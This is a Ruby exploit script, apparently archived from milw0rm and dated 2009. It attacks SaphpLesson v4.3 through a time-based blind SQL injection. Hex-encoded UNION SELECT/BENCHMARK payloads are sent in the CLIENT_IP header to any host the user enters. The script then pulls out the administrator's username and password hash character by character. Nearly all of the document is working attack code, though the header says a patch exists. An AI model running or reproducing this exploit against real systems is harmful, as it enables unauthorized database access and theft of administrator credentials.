<html><head><title>Saphplesson 4.3 Remote Blind SQL Injection Exploit</title></head><pre>#!/usr/bin/ruby

#=============================================#
#          SaphpLesson v4.3 Exploit           #
#     Blind SQL Injection Vulnerability       #
#---------------------------------------------#
# Date: 21-08-2009                            #
# Discovered &amp; written by: Jafer Al Zidjali   #
# Email: jafer[at]scorpionds.com              #
# Website: www.scorpionds.com                 #
#---------------------------------------------#
# Notes:                                      #
#       1. Author has been notified           #
#       2. A public patch has been released   #
#=============================================#


require &quot;net/http&quot;
require &quot;base64&quot;

intro=[
          &quot;+=============================================+&quot;,
          &quot;+          SaphpLesson v4.3 Exploit           +&quot;,
          &quot;+     Blind SQL Injection Vulnerability       +&quot;,
          &quot;+  Discovered &amp; written by: Jafer Al Zidjali  +&quot;,
          &quot;+        Email: jafer[at]scorpionds.com       +&quot;,
          &quot;+         Website: www.scorpionds.com         +&quot;,
          &quot;+=============================================+&quot;
          ]

def print_intro text
  w=&quot;|&quot;
  text.each do |str|
    str.scan(/./) do |c|
        STDOUT.flush
      if w==&quot;|&quot; 
        print &quot;\b&quot;+c +w
        w=&quot;/&quot;
      elsif w==&quot;/&quot; 
        print &quot;\b&quot;+c +w
        w=&quot;-&quot;  
      elsif w==&quot;-&quot; 
        print &quot;\b&quot;+c +w
        w=&quot;\\&quot; 
      else
      print &quot;\b&quot;+c +w
      w=&quot;|&quot;
      end
      sleep 0.04
    end
    print &quot;\b &quot;
    puts &quot;&quot;
  end
end

print_intro intro

puts &quot;\nEnter host name (e.g. example.com):&quot;
host=gets.chomp

puts &quot;\nEnter script path (e.g. /saphplesson/):&quot;
path=gets.chomp


puts &quot;\nGetting average response time...&quot;

avgTime=Array.new(5)

5.times do |c|
  s=Time.now
  http = Net::HTTP.new(host, 80)
  resp= http.get(path)
  w=resp.body
  avgTime[c]=Time.now-s
  puts avgTime[c]
end

sum=0
5.times {|c| sum+=avgTime[c]}
avg=sum/5.0
puts &quot;Average response time is: #{avg*3.0}&quot;

puts &quot;\nTesting delayed response time...&quot;
delTime=Array.new(5)

5.times do |t|
  delay=1000000*((t+1)*10)
  header={
  &quot;CLIENT_IP&quot; =&gt;  &quot;\x27\x20\x55\x4e\x49\x4f\x4e\x20\x53\x45\x4c\x45\x43\x54&quot;+
                  &quot;\x20\x49\x46\x28\x31\x3d\x31\x2c\x42\x45\x4e\x43\x48\x4d&quot;+
                  &quot;\x41\x52\x4b\x28#{delay}\x2c\x63\x68\x61\x72\x28\x63\x68&quot;+
                  &quot;\x61\x72\x28\x32\x29\x29\x29\x2c\x33\x34\x33\x34\x29\x20\x23\x20&quot;
  }
  s=Time.now
  http = Net::HTTP.new(host, 80)
  resp= http.get(path,header)
  w=resp.body
  s=Time.now-s
  delTime[t]=delay
  puts &quot;[&quot;+(t+1).to_s+&quot;] #{s}&quot;
end

puts &quot;\nChoose a delyed response time (it should be &gt; average response time):&quot;
sel=gets.chomp

print &quot;\nGetting username length&quot;
ulen=0

20.times do |z|
  header={
  &quot;CLIENT_IP&quot; =&gt;  &quot;\x27\x20\x55\x4e\x49\x4f\x4e\x20\x53\x45\x4c\x45\x43\x54&quot;+
                  &quot;\x20\x49\x46\x28\x6c\x65\x6e\x67\x74\x68\x28\x28\x73\x65\x6c\x65\x63\x74&quot;+
                  &quot;\x20\x4d\x6f\x64\x4e\x61\x6d\x65\x20\x66\x72\x6f\x6d\x20\x6d\x6f\x64\x72&quot;+
                  &quot;\x65\x74\x6f\x72\x20\x77\x68\x65\x72\x65\x20\x4d\x6f\x64\x49\x44\x3d\x31&quot;+
                  &quot;\x29\x29\x3d#{z+1}\x2c\x42\x45\x4e\x43\x48\x4d\x41\x52\x4b\x28#{delTime[(sel.to_i)-1]}&quot;+
                  &quot;\x2c\x63\x68\x61\x72\x28\x63\x68\x61\x72\x28\x32\x29\x29\x29\x2c\x33\x34\x33\x34\x29\x20\x23\x20&quot;
  }
  s=Time.now
  http = Net::HTTP.new(host, 80)
  resp= http.get(path,header)
  w=resp.body
  s=Time.now-s
  print &quot;.&quot;
    if (s&gt;(avg*3.0))
      ulen=z+1
      break;
    end
  STDOUT.flush
end

puts &quot;\n\nUsername length: &quot;+ ulen.to_s

puts &quot;\n\nUsername: &quot;
chars=&quot;abcdefghijklmnopqrstuvwxyz0123456789&quot;

ulen.times do |z|
  chars.scan(/./) do |c|
    header={
    &quot;CLIENT_IP&quot; =&gt; &quot;\x27\x20\x55\x4e\x49\x4f\x4e\x20\x53\x45\x4c\x45\x43&quot;+
    &quot;\x54\x20\x49\x46\x28\x73\x75\x62\x73\x74\x72\x69\x6e\x67\x28\x28\x73&quot;+
    &quot;\x65\x6c\x65\x63\x74\x20\x4d\x6f\x64\x4e\x61\x6d\x65\x20\x66\x72\x6f&quot;+
    &quot;\x6d\x20\x6d\x6f\x64\x72\x65\x74\x6f\x72\x20\x77\x68\x65\x72\x65\x20&quot;+
    &quot;\x4d\x6f\x64\x49\x44\x3d\x31\x29\x2c#{z+1}\x2c\x31\x29\x3d\x27#{c}\x27&quot;+
    &quot;\x2c\x42\x45\x4e\x43\x48\x4d\x41\x52\x4b\x28#{delTime[(sel.to_i)-1]}&quot;+
    &quot;\x2c\x63\x68\x61\x72\x28\x63\x68\x61\x72\x28\x32\x29\x29\x29\x2c\x33&quot;+
    &quot;\x34\x33\x34\x29\x20\x23\x20&quot;
    }
    s=Time.now
    http = Net::HTTP.new(host, 80)
    resp= http.get(path,header)
    w=resp.body
    s=Time.now-s
    print c
      if (s&gt;(avg*3.0))
        break;
      end
    print &quot;\b&quot;
    STDOUT.flush
  end
end

puts &quot;\n\nPassword hash: &quot;
chars=&quot;0123456789abcdef&quot;

32.times do |z|
  chars.scan(/./) do |c|
    header={
    &quot;CLIENT_IP&quot; =&gt; &quot;\x27\x20\x55\x4e\x49\x4f\x4e\x20\x53\x45\x4c\x45\x43\x54&quot;+
    &quot;\x20\x49\x46\x28\x73\x75\x62\x73\x74\x72\x69\x6e\x67\x28\x28\x73\x65\x6c&quot;+
    &quot;\x65\x63\x74\x20\x4d\x6f\x64\x50\x61\x73\x73\x77\x6f\x72\x64\x20\x66\x72&quot;+
    &quot;\x6f\x6d\x20\x6d\x6f\x64\x72\x65\x74\x6f\x72\x20\x77\x68\x65\x72\x65\x20&quot;+
    &quot;\x4d\x6f\x64\x49\x44\x3d\x31\x29\x2c#{z+1}\x2c\x31\x29\x3d\x27#{c}\x27\x2c&quot;+
    &quot;\x42\x45\x4e\x43\x48\x4d\x41\x52\x4b\x28#{delTime[(sel.to_i)-1]}&quot;+
    &quot;\x2c\x63\x68\x61\x72\x28\x63\x68\x61\x72\x28\x32\x29\x29\x29\x2c\x33\x34&quot;+
    &quot;\x33\x34\x29\x20\x23\x20&quot;
    }
    s=Time.now
    http = Net::HTTP.new(host, 80)
    resp= http.get(path,header)
    w=resp.body
    s=Time.now-s
    print c
      if (s&gt;(avg*3.0))
        break;
      end
    print &quot;\b&quot;
    STDOUT.flush
  end
end

# milw0rm.com [2009-09-16]</pre></html>